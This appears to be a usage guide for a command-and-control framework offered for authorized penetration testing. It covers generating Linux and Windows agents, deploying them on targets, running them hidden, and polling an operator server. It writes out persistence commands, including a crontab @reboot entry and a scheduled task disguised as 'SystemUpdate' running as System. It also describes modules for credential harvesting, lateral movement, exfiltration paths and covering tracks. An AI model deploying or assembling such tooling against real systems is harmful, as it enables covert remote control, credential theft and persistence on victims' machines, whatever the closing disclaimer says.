# C2 Server - Usage Guide

## Quick Start

### 1. Install Dependencies

The C2 server requires Flask and requests. Install them using:

```bash
pip install -r requirements.txt
```

### 2. Start the C2 Server

```bash
python main.py server --host 0.0.0.0 --port 5000
```

The server will start and display:
- Dashboard URL: `http://0.0.0.0:5000`
- API endpoints for agent communication

### 3. Generate Agents

#### Linux Agent
```bash
python main.py generate linux --c2-server http://YOUR_SERVER_IP:5000
```

#### Windows Agent
```bash
python main.py generate windows --c2-server http://YOUR_SERVER_IP:5000
```

Generated files will be in `generated_agents/` directory:
- `agent_linux_TIMESTAMP.py` or `agent_windows_TIMESTAMP.py`
- `modules/` directory (security assessment modules)
- `requirements.txt` (agent dependencies)

### 4. Deploy Agent to Target

#### Linux Deployment

Transfer files to target:
```bash
scp -r generated_agents/* user@target:/tmp/agent/
```

On target system:
```bash
cd /tmp/agent
pip3 install -r requirements.txt
python3 agent_linux_*.py http://YOUR_SERVER_IP:5000
```

#### Windows Deployment

Transfer files to target, then:
```cmd
cd C:\temp\agent
pip install -r requirements.txt
python agent_windows_*.py http://YOUR_SERVER_IP:5000
```

### 5. Use the Dashboard

1. Open browser to `http://YOUR_SERVER_IP:5000`
2. View registered agents in "Active Agents" section
3. Select an agent and security module
4. Click "Execute" to run assessment
5. View results in "Recent Results" section

## Security Assessment Modules

### 1. Privilege Escalation
Checks for privilege escalation opportunities:
- **Linux**: SUID binaries, sudo permissions, writable /etc/passwd, writable PATH directories
- **Windows**: Admin privileges, unquoted service paths, AlwaysInstallElevated registry key

### 2. Persistence
Identifies persistence mechanisms:
- **Linux**: Cron jobs, systemd services, startup scripts (.bashrc, .profile)
- **Windows**: Registry Run keys, scheduled tasks, startup folders

### 3. Credential Harvesting
Finds credential storage locations:
- **Linux**: SSH keys, bash history, config files (.aws, .docker, .gitconfig)
- **Windows**: Saved credentials, unattended install files, AutoLogon passwords, WiFi profiles

### 4. Internal Reconnaissance
Gathers system information:
- System details (hostname, platform, architecture)
- Network interfaces and IP addresses
- Active network connections
- Running processes
- System users
- Mounted filesystems (Linux) / Domain info (Windows)

### 5. Lateral Movement
Identifies lateral movement opportunities:
- **Linux**: SSH config hosts, known_hosts, NFS shares, SMB/CIFS mounts, ARP cache
- **Windows**: Network shares, mapped drives, domain computers, active sessions, ARP cache

### 6. Data Access
Locates sensitive data:
- Interesting files (.txt, .pdf, .doc, .xls, .csv, .sql, .db)
- Database files (.db, .sqlite, .sqlite3)
- Backup files (.bak, .backup)
- Browser data locations
- Recent files (Windows)

### 7. Data Exfiltration
Checks exfiltration paths:
- Internet connectivity
- Available exfiltration tools (curl, wget, nc, python)
- Removable media detection
- Cloud storage folders (Dropbox, Google Drive, OneDrive)
- DNS resolution capabilities

### 8. C2 Check
Validates C2 communication capabilities:
- Outbound port connectivity (80, 443, 8080, 53)
- Proxy settings
- Firewall status
- Suspicious processes

### 9. Covering Tracks
Identifies log files and artifacts:
- **Linux**: System logs, bash history, auditd status, recent logins
- **Windows**: Event logs, PowerShell history, recent files, Prefetch files, Windows Defender logs

## API Reference

### Agent Endpoints

#### Register Agent
```http
POST /api/agent/register
Content-Type: application/json

{
  "agent_id": "uuid",
  "hostname": "target-host",
  "platform": "Linux"
}
```

#### Agent Beacon
```http
POST /api/agent/<agent_id>/beacon
Content-Type: application/json

{
  "status": "active"
}

Response:
{
  "commands": [
    {
      "id": 1,
      "command": "privilege_escalation",
      "module": "privilege_escalation"
    }
  ]
}
```

#### Submit Results
```http
POST /api/agent/<agent_id>/result
Content-Type: application/json

{
  "command_id": 1,
  "module": "privilege_escalation",
  "result": {
    "module": "privilege_escalation",
    "findings": [...]
  }
}
```

### Operator Endpoints

#### List Agents
```http
GET /api/agents

Response:
{
  "agents": [
    {
      "id": "uuid",
      "hostname": "target-host",
      "platform": "Linux",
      "ip_address": "192.168.1.50",
      "last_seen": "2026-01-13 00:00:00",
      "status": "active"
    }
  ]
}
```

#### Queue Command
```http
POST /api/command
Content-Type: application/json

{
  "agent_id": "uuid",
  "module": "privilege_escalation"
}

Response:
{
  "status": "queued",
  "command_id": 1
}
```

#### Get Results
```http
GET /api/results?agent_id=uuid&module=privilege_escalation

Response:
{
  "results": [
    {
      "id": 1,
      "agent_id": "uuid",
      "module": "privilege_escalation",
      "result": "{...}",
      "timestamp": "2026-01-13 00:00:00"
    }
  ]
}
```

## Advanced Usage

### Custom Beacon Interval

Edit the agent file and modify:
```python
self.beacon_interval = 30  # seconds
```

### Running Agent in Background

**Linux:**
```bash
nohup python3 agent_linux_*.py http://SERVER:5000 > /dev/null 2>&1 &
```

**Windows:**
```cmd
start /B python agent_windows_*.py http://SERVER:5000
```

### Making Agent Persistent

**Linux (crontab):**
```bash
(crontab -l 2>/dev/null; echo "@reboot python3 /path/to/agent.py http://SERVER:5000") | crontab -
```

**Windows (scheduled task):**
```cmd
schtasks /create /tn "SystemUpdate" /tr "python C:\path\to\agent.py http://SERVER:5000" /sc onlogon /ru System
```

### Using HTTPS

For production, use HTTPS with proper certificates:

1. Generate SSL certificate
2. Modify server.py to use SSL context:
```python
app.run(host=host, port=port, ssl_context=('cert.pem', 'key.pem'))
```

### Adding Custom Modules

1. Create module in `modules/new_module.py`:
```python
import platform

def check_new_module():
    results = {
        'module': 'new_module',
        'findings': [],
        'platform': platform.system()
    }
    
    # Add your checks here
    results['findings'].append({
        'check': 'Custom Check',
        'status': 'found',
        'details': 'Custom check results'
    })
    
    return results
```

2. Register in `modules/__init__.py`:
```python
from .new_module import check_new_module

MODULE_MAP = {
    # ... existing modules
    'new_module': check_new_module
}
```

3. Add to dashboard dropdown in `c2_operator/server.py`

## Troubleshooting

### Agent Can't Connect to C2

**Check network connectivity:**
```bash
ping YOUR_SERVER_IP
curl http://YOUR_SERVER_IP:5000/api/agents
```

**Check firewall:**
```bash
# Linux
sudo iptables -L -n | grep 5000

# Windows
netsh advfirewall firewall show rule name=all | findstr 5000
```

### Module Execution Errors

**Check permissions:**
- Some modules require elevated privileges
- Run agent with sudo (Linux) or as Administrator (Windows)

**Check dependencies:**
- Ensure all required tools are installed
- Some modules use system commands that may not be available

### Database Locked

If you see "database is locked" errors:
```bash
# Stop all C2 server instances
pkill -f "python.*server.py"

# Remove lock
rm c2_server.db-journal

# Restart server
python main.py server
```

## Security Best Practices

1. **Use HTTPS** - Always use encrypted communications in production
2. **Authentication** - Implement authentication for the dashboard
3. **Network Segmentation** - Run C2 server on isolated network
4. **Log Management** - Regularly review and rotate logs
5. **Agent Cleanup** - Remove agents after assessment completion
6. **Data Encryption** - Encrypt sensitive data at rest and in transit
7. **Access Control** - Limit access to C2 server and dashboard
8. **Regular Updates** - Keep dependencies updated

## Legal and Ethical Considerations

⚠️ **IMPORTANT**: This tool is for authorized security testing only.

- Obtain written permission before testing any system
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations
- Document all activities for audit purposes
- Respect privacy and data protection laws
- Use only on systems you own or have explicit authorization to test

## Support and Contribution

For issues, questions, or contributions:
- Review the README.md for project overview
- Check existing issues before creating new ones
- Follow coding standards when contributing
- Add tests for new features
- Update documentation for changes

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**
